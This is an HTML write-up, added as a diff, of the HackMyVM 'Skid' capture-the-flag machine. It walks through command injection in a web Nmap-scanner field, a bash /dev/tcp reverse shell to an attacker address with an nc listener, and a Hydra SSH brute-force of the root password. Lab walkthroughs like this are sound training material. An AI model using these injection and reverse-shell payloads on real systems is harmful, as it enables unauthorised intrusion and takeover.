@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>./Skid</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <a href="/" class="back-link">[ < ] Homepage</a> 
+    <br> <br> <h1 style="font-family:'JetBrains Mono', monospace;">Skid | HackMyVM</h1>
+    <div class="math-block" style="border-left-color: #641159;">
+        <p><strong>Description:</strong> A script kiddie named jeremy just found out about hacking a few days ago! Can you hack him before he tries something dumb?</p>
+        <p><strong>Difficulty:</strong> Easy</p>
+        <p><strong>Download:</strong> <a href="https://downloads.hackmyvm.eu/skid.zip" class="back-link" target="_blank">Skid</a> - <a href="https://hackmyvm.eu/profile/?user=zedd9001"class="back-link" target="_blank">zedd9001</a></p>
+        <p><strong>Tags:</strong> <code>command injection</code> <code>reverse-shell</code> <code>hydra</code></p>
+    </div>
+    <div class="writeup-container">
+     <section>
+        <h2>1. Enumeration</h2>
+        <p>The target machine is enumerated for any open services.</p>
+        <pre><code>
+            ┌──(kali㉿kali)-[~]
+            └─$ nmap -sV -sS -p- 192.168.56.xxx
+            Nmap scan report for 192.168.56.xxx
+            PORT     STATE SERVICE VERSION
+            22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+            5000/tcp open  http    Werkzeug httpd 3.0.6 (Python 3.8.10)
+            MAC Address: 08:00:27:XX:XX:XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+            Nmap done: 1 IP address (1 host up) scanned in 37.54 seconds
+        </code></pre>
+        <p>Two services are open: HTTP and SSH.</p>
+    </section>
+
+    <section>
+        <h2>2. Web Exploitation</h2>
+        <h3>2.1 Command Injection</h3>
+        <p>
+        The HTTP service runs on port 5000. On visiting it, there are two main elements: an Nmap Scanner and a Reverse Shell Generator.
+        After some testing, it becomes apparent that the Nmap scanner is vulnerable to command injection.
+        </p>
+        <p>Let's try a payload: <strong>127.0.0.1 ; whoami</strong></p>
+        <p>
+        If the input field is not sanitized, the semicolon acts as a command terminator and <code>whoami</code> gets executed as a separate command.
+        </p>
+        <pre><code>
+            Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-12 10:19 UTC
+            Nmap scan report for localhost (127.0.0.1)
+            Host is up (0.000035s latency).
+            Not shown: 998 closed ports
+            PORT     STATE SERVICE
+            22/tcp   open  ssh
+            5000/tcp open  upnp
+            Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
+            <strong>jeremy</strong>
+            # Nmap 7.80 scan initiated Tue May 12 10:19:00 2026 as: nmap -T4 -oN /tmp/scan.txt 127.0.0.1
+            Nmap scan report for localhost (127.0.0.1)
+            Host is up (0.000035s latency).
+            Not shown: 998 closed ports
+            PORT     STATE SERVICE
+            22/tcp   open  ssh
+            5000/tcp open  upnp
+            # Nmap done at Tue May 12 10:19:00 2026 -- 1 IP address (1 host up) scanned in 0.07 seconds
+        </code></pre>
+        <p>The command executed successfully and revealed that <strong>jeremy</strong> is the current user. This injection point can be used to trigger a reverse shell.</p>
+        <h3>2.2 Reverse Shell Generation</h3>
+        <p>
+        A reverse shell works by having the target machine connect back to the attacker's listener, typically exploited via remote code execution or command injection.
+        The web service conveniently includes a built-in reverse shell generator. Generating a payload with the attacker's IP and a chosen port:
+        </p>
+        <p>
+        <strong>IP: 192.168.56.XXX</strong><br>
+        <strong>Port: 4444</strong>
+        </p>
+        <p>The generated payload is:</p>
+        <pre><code>bash -i &gt;&amp; /dev/tcp/192.168.56.XXX/4444 0&gt;&amp;1</code></pre>
+
+        <h3>2.3 Setting Up the Listener and Payload</h3>
+        <p>First, set up a listener on the attacker machine to catch the incoming shell:</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <p>Next, inject the payload through the vulnerable Nmap scanner field:</p>
+        <pre><code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/192.168.56.XXX/4444 0&gt;&amp;1</code></pre>
+        <p>
+        However, this did not work initially. The error below indicates the web server defaults to <code>dash</code> instead of <code>bash</code>:
+        </p>
+        <pre><code><strong>/bin/sh: 1: Syntax error: Bad fd number</strong></code></pre>
+        <p>To work around this, the injection explicitly calls <code>bash</code> to execute the payload:</p>
+        <pre><code>127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.102/4444 0&gt;&amp;1'</code></pre>
+        <p>The listener confirms a successful connection to the target machine:</p>
+        <pre><code>
+            ┌──(kali㉿kali)-[~]
+            └─$ nc -lvnp 4444
+            listening on [any] 4444 ...
+            connect to [192.168.56.102] from (UNKNOWN) [192.168.56.108] 55700
+            jeremy@skid:~$ whoami
+            whoami
+            jeremy
+        </code></pre>
+        <p>From here, the shell can be explored further:</p>
+        <pre><code>
+            jeremy@skid:~$ ls
+            ls
+            app
+            changes.txt
+            hacking-tools
+            user.txt
+            wordlists
+            jeremy@skid:~$ cat user.txt
+            cat user.txt
+            <strong>hmv{XXX}</strong>
+        </code></pre>
+        <p>The user flag is retrieved.</p>
+        <p>
+        Reading <code>changes.txt</code> reveals a mention of custom wordlists. This hints at using those wordlists to brute-force the root password via Hydra:
+        </p>
+        <pre><code>
+            jeremy@skid:~$ <strong>hydra -l root -P ./wordlists/secure-passwds.txt ssh://192.168.56.108</strong>
+            hydra -l root -P ./wordlists/secure-passwds.txt ssh://192.168.56.108
+            [DATA] attacking ssh://192.168.56.XXX:22/
+            [22][ssh] host: 192.168.56.108   <strong>login: root   password: sk1ddl3</strong>
+            1 of 1 target successfully completed, 1 valid password found
+        </code></pre>
+        <p>Privilege escalation to root is achieved using the cracked password:</p>
+        <pre><code>
+            root@skid:~# whoami
+            root
+            root@skid:~# ls
+            root.txt  snap
+            root@skid:~# cat root.txt
+            Help I lost the root flag!
+            Can you please help me find it?
+            root@skid:~# find / -name "root.txt" 2>/dev/null
+            /var/lib/.cache2/root.txt
+            /root/root.txt
+            root@skid:~# cat /var/lib/.cache2/root.txt
+            <strong>hmv{XXX}</strong>
+        </code></pre>
+        <p>
+        The <code>root.txt</code> in the home directory does not contain the flag. Using <code>find</code> to search the entire filesystem reveals the actual flag tucked away in the <code>/var/lib/.cache2/</code> directory.
+        </p>
+        <p style="font-size: 18px; margin-top: 2rem;">
+        Thank you for reading.<br>
+        <strong>— EXIT —</strong>
+        </p>
+    </section>
+    </div>
+
+    </body>
+    </html>
